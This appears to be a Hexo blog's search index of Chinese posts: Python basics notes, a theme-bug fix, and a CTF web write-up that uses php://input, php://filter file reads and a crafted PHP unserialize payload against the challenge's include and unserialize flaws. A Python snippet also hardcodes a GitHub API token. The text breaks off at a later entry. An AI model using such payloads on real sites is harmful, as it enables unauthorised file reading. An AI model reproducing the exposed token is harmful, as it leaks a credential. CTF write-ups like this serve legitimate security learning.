<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python-虚拟管理工具Anaconda</title>
      <link href="/2020/01/18/python-%E8%99%9A%E6%8B%9F%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7Anaconda/"/>
      <url>/2020/01/18/python-%E8%99%9A%E6%8B%9F%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7Anaconda/</url>
      
        <content type="html"><![CDATA[<p>被python2和python3的pip弄崩溃了，出现的问题就没人出现过</p><p>怎么搜索也没得思路，决定另辟蹊径</p><p>不行就重新装</p><p><img src="https://s2.ax1x.com/2020/01/18/19KnjU.png" alt="19KnjU.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sublime-python爬虫gbk编码一系列问题</title>
      <link href="/2020/01/18/sublime-python%E7%88%AC%E8%99%ABgbk%E7%BC%96%E7%A0%81%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98/"/>
      <url>/2020/01/18/sublime-python%E7%88%AC%E8%99%ABgbk%E7%BC%96%E7%A0%81%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python字符编码</title>
      <link href="/2020/01/18/python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
      <url>/2020/01/18/python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python-json-beautifulsoup</title>
      <link href="/2020/01/17/python-json/"/>
      <url>/2020/01/17/python-json/</url>
      
        <content type="html"><![CDATA[<p>dump序列</p><p>loads  逆过程</p><p>配合显示字典</p><p>requests 爬 github网站的code等</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#auther:loop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> loop_json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">"baidu"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.github.com/search/code?q=%s"</span> % key</span><br><span class="line"></span><br><span class="line">TOKEN = <span class="string">'00e2b39028d493c56fc2737f7a9fa11011d02ef0'</span></span><br><span class="line">headers = &#123;<span class="string">"Authorization"</span>: <span class="string">"token %s"</span> % TOKEN&#125;</span><br><span class="line">params = &#123;<span class="string">"per_page"</span>: <span class="number">10</span>, <span class="string">"page"</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="comment"># = requests.get(url, headers=headers, params=params)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#d = r.json()</span></span><br><span class="line"></span><br><span class="line">loop_json.abc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"test"</span></span><br></pre></td></tr></table></figure><p>Token是账户设置的一个值</p><p>key是查找内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">abc</span><span class="params">(ddd)</span>:</span></span><br><span class="line">    _dic = &#123;<span class="string">"name"</span>:<span class="string">"loop"</span>, <span class="string">"age"</span>:<span class="string">"12"</span>&#125;</span><br><span class="line"></span><br><span class="line">    s = json.dumps(_dic, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print type(s)</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#d = json.loads(s)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print d</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:<span class="comment">#只有主函数是本文件才会运行</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"loop"</span></span><br></pre></td></tr></table></figure><p>Beautifulsoup用来爬具体网页的信息</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python4</title>
      <link href="/2020/01/16/python4/"/>
      <url>/2020/01/16/python4/</url>
      
        <content type="html"><![CDATA[<h4 id="python-day4-requests库"><a href="#python-day4-requests库" class="headerlink" title="python-day4-requests库"></a>python-day4-requests库</h4><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> python-requests </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python-requests </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-day3</title>
      <link href="/2020/01/16/python-day3/"/>
      <url>/2020/01/16/python-day3/</url>
      
        <content type="html"><![CDATA[<h3 id="python-day3-列表、元组、字典"><a href="#python-day3-列表、元组、字典" class="headerlink" title="python-day3 列表、元组、字典"></a>python-day3 列表、元组、字典</h3><h4 id="列表，"><a href="#列表，" class="headerlink" title="列表，"></a>列表，</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>];</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ];</span><br><span class="line">list3 = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>,<span class="string">"d"</span>]</span><br></pre></td></tr></table></figure><p>列表下标从0开始</p><h5 id="访问，"><a href="#访问，" class="headerlink" title="访问，"></a>访问，</h5><h5 id="删除"><a href="#删除" class="headerlink" title="删除,"></a>删除,</h5><p>del list[0];</p><h5 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h5><p>len（list）长度；+连接；*重复；3 in list 判断是否存在；</p><a id="more"></a><h5 id="访问，-1"><a href="#访问，-1" class="headerlink" title="访问，"></a>访问，</h5><p>：是之后，list[0:]，-号是从后往前；</p><h5 id="嵌套："><a href="#嵌套：" class="headerlink" title="嵌套："></a>嵌套：</h5><p>x=[],n=[],y=[x,n];</p><h5 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h5><p> len(),max/min(),</p><h5 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h5><p>list.append(obj)在列表末尾添加新的对象<br>list.count(obj)统计某个元素在列表中出现的次数<br>list.extend(seq)在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br>list.index(obj)从列表中找出某个值第一个匹配项的索引位置<br>list.insert(index, obj)将对象插入列表<br>list.pop([index=-1])移除列表中的一个元素（默认最后一个元素），并且返回该元素的值<br>list.remove(obj)移除列表中某个值的第一个匹配项<br>list.reverse()反向列表中元素<br>list.sort( key=None, reverse=False)对原列表进行排序<br>list.clear()清空列表<br>list.copy()复制列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">list.append(<span class="string">'name'</span>)</span><br><span class="line">print(list)</span><br><span class="line">print(len(list))</span><br><span class="line">print(list*<span class="number">4</span>)</span><br><span class="line">list.remove(<span class="string">'name'</span>)</span><br><span class="line">print(list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    print(i)</span><br><span class="line">n = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">x = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">list = [n,x]</span><br><span class="line">print(list)</span><br><span class="line">print(list[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">//</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">'name'</span>]</span><br><span class="line"><span class="number">5</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">'name'</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">'name'</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">'name'</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">'name'</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改。</p><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tup1=(<span class="string">'z'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>)</span><br><span class="line">tup2=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">tup3=<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span></span><br><span class="line">print(type(tup3))</span><br></pre></td></tr></table></figure><p>空元组：tup1=（）；</p><p>元组中只包含一个元素时，需要在元素后面添加逗号，否则括号会被当作运算符使用：</p><h5 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h5><p>一样用[]；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"tup1[0]: "</span>, tup1[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"tup2[1:5]: "</span>, tup2[<span class="number">1</span>:<span class="number">5</span>])</span><br></pre></td></tr></table></figure><p>和列表一致，无法修改，除非重新赋值到另一个元组；</p><p>无法删除，只可以全部删除</p><p>空数组无法输出，输出会报错；</p><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><p>len();+;*;in ;for x in tup();</p><p>id()查看元组地址；</p><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>字典的每个键值(key=&gt;value)对用冒号(<strong>:</strong>)分割，每个对之间用逗号(<strong>,</strong>)分割，整个字典包括在花括号(<strong>{})</strong>中；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;key1 : value1, key2 : value2 &#125;</span><br><span class="line">dict = &#123;<span class="string">'Alice'</span>: <span class="string">'2341'</span>, <span class="string">'Beth'</span>: <span class="string">'9102'</span>, <span class="string">'Cecil'</span>: <span class="string">'3258'</span>&#125;</span><br></pre></td></tr></table></figure><h5 id="访问-1"><a href="#访问-1" class="headerlink" title="访问"></a>访问</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>])</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br></pre></td></tr></table></figure><h5 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"> </span><br><span class="line">dict[<span class="string">'Age'</span>] = <span class="number">8</span>               <span class="comment"># 更新 Age</span></span><br><span class="line">dict[<span class="string">'School'</span>] = <span class="string">"菜鸟教程"</span>  <span class="comment"># 添加信息</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> dict[<span class="string">'Name'</span>] <span class="comment"># 删除键 'Name'</span></span><br><span class="line">dict.clear()     <span class="comment"># 清空字典</span></span><br><span class="line"><span class="keyword">del</span> dict         <span class="comment"># 删除字典</span></span><br></pre></td></tr></table></figure><h5 id="字典特性"><a href="#字典特性" class="headerlink" title="字典特性"></a>字典特性</h5><p>1.不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住，否则输入后定义的键值</p><p>2.键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行，如下实例：</p><h5 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h5><table><thead><tr><th>1</th><th><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html" target="_blank" rel="noopener">radiansdict.clear()</a> 删除字典内所有元素</th></tr></thead><tbody><tr><td>2</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html" target="_blank" rel="noopener">radiansdict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td>3</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html" target="_blank" rel="noopener">radiansdict.fromkeys()</a>  创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td>4</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html" target="_blank" rel="noopener">radiansdict.get(key, default=None)</a> 返回指定键的值，如果值不在字典中返回default值</td></tr><tr><td>5</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html" target="_blank" rel="noopener">key in dict</a> 如果键在字典dict里返回true，否则返回false</td></tr><tr><td>6</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html" target="_blank" rel="noopener">radiansdict.items()</a> 以列表返回可遍历的(键, 值) 元组数组</td></tr><tr><td>7</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html" target="_blank" rel="noopener">radiansdict.keys()</a> 返回一个迭代器，可以使用 list() 来转换为列表</td></tr><tr><td>8</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html" target="_blank" rel="noopener">radiansdict.setdefault(key, default=None)</a>     和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td>9</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html" target="_blank" rel="noopener">radiansdict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td></tr><tr><td>10</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html" target="_blank" rel="noopener">radiansdict.values()</a> 返回一个迭代器，可以使用 list() 来转换为列表</td></tr><tr><td>11</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html" target="_blank" rel="noopener">pop(key[,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td>12</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html" target="_blank" rel="noopener"> popitem()</a> 随机返回并删除字典中的最后一对键和值。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>next主题 日志和归档重合问题</title>
      <link href="/2020/01/15/next%E4%B8%BB%E9%A2%98-%E6%97%A5%E5%BF%97%E5%92%8C%E5%BD%92%E6%A1%A3%E9%87%8D%E5%90%88%E9%97%AE%E9%A2%98/"/>
      <url>/2020/01/15/next%E4%B8%BB%E9%A2%98-%E6%97%A5%E5%BF%97%E5%92%8C%E5%BD%92%E6%A1%A3%E9%87%8D%E5%90%88%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2020/01/15/lX0Yct.png" alt="lX0Yct.png"></p><p>如图篇所示，其点开之后报错，Cannot GET /archives/%7C%7C%20archive/</p><p><img src="https://s2.ax1x.com/2020/01/15/lX0cj0.png" alt="lX0cj0.png"></p><p>点击归档之后没有问题，正常显示，</p><a id="more"></a><p>证明不是格式空格问题，</p><p><img src="https://s2.ax1x.com/2020/01/15/lX64UK.png" alt="lX64UK.png"></p><p>只要在archives前加上#，注销掉，菜单上归档消失但点击日志就正常了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>可移植性</title>
      <link href="/2020/01/04/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7/"/>
      <url>/2020/01/04/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_38216239/article/details/84500704" target="_blank" rel="noopener">https://blog.csdn.net/qq_38216239/article/details/84500704</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.25ctf</title>
      <link href="/2019/12/26/12-25ctf/"/>
      <url>/2019/12/26/12-25ctf/</url>
      
        <content type="html"><![CDATA[<h1 id="2019圣诞ctf大旗大赛web-admin"><a href="#2019圣诞ctf大旗大赛web-admin" class="headerlink" title="2019圣诞ctf大旗大赛web-admin"></a>2019圣诞ctf大旗大赛web-admin</h1><p>打开题目查看源代码：</p><p><img src="https://s2.ax1x.com/2019/12/26/lEZ8IK.png" alt="lEZ8IK.png"></p><p>三个get值，user，file，pass；</p><p>代码提示需要user=admin，file_get_contents()是post形式提交；</p><p>这里要用到php://filter协议中的php://input;</p><p>file提示我们打开class.php;</p><a id="more"></a><p>pass暂时没有要求；</p><p>构造payload;</p><p><img src="https://s2.ax1x.com/2019/12/26/lEZ7JU.png" alt="lEZ7JU.png"></p><p><img src="https://s2.ax1x.com/2019/12/26/lEZLQJ.png" alt="lEZLQJ.png"></p><p>看到这里就想到应该是考察php：//filter协议了，class.php没显示，构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=class.php</span><br></pre></td></tr></table></figure><p>base64解码：</p><p><img src="https://s2.ax1x.com/2019/12/26/lEmZjJ.png" alt="lEmZjJ.png"></p><p>要访问fffffflag.php；但并没有提示如何，尝试多次无果</p><p>于是访问了下index.php；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.55.43.255:28119/?user=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php&amp;pass=1</span><br><span class="line">post:admin</span><br></pre></td></tr></table></figure><p>解码得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/fffffflag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hava a rest and then change your choose."</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --</span><br></pre></td></tr></table></figure><p>重点在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/fffffflag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>if(preg_match(“/fffffflag/“,$file)){exit();</p><p>$pass = unserialize($pass);<br>        echo $pass;</p><p>这两句代码再结合之前的Read类，是要反序列化构建pass类才可以。</p><p>构建payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:62:&quot;php://filter/read=convert.base64-encode/resource=fffffflag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到flag;</p><p><a href="https://imgchr.com/i/lEnaM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/26/lEnaM4.md.png" alt="lEnaM4.md.png"></a></p><p><img src="https://s2.ax1x.com/2019/12/26/lEnfLd.png" alt="lEnfLd.png"></p><p>反序列化的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Read&quot;:1&#123;s:4:&quot;file&quot;;s:62:&quot;php://filter/read=convert.base64-encode/resource=fffffflag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">O:4:”Read” 指的是 类：个字符：Read</span><br><span class="line"></span><br><span class="line">:2:  指的是 有两个对象</span><br><span class="line"></span><br><span class="line">S:4:”\00*\00file”   指的是有个属性，有4个字符，名为file</span><br><span class="line"></span><br><span class="line">s:62:”flag.php”   指的是属性值，有62个字符，值为php://filter/read=convert.base64-encode/resource=fffffflag.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-php://filter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>北工校内选拔-web1</title>
      <link href="/2019/12/21/%E5%8C%97%E5%B7%A5%E6%A0%A1%E5%86%85%E9%80%89%E6%8B%94-web1/"/>
      <url>/2019/12/21/%E5%8C%97%E5%B7%A5%E6%A0%A1%E5%86%85%E9%80%89%E6%8B%94-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="北工校内选拔-WEB"><a href="#北工校内选拔-WEB" class="headerlink" title="北工校内选拔-WEB"></a>北工校内选拔-WEB</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web-upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows系统密码</title>
      <link href="/2019/12/15/windows%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/"/>
      <url>/2019/12/15/windows%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/</url>
      
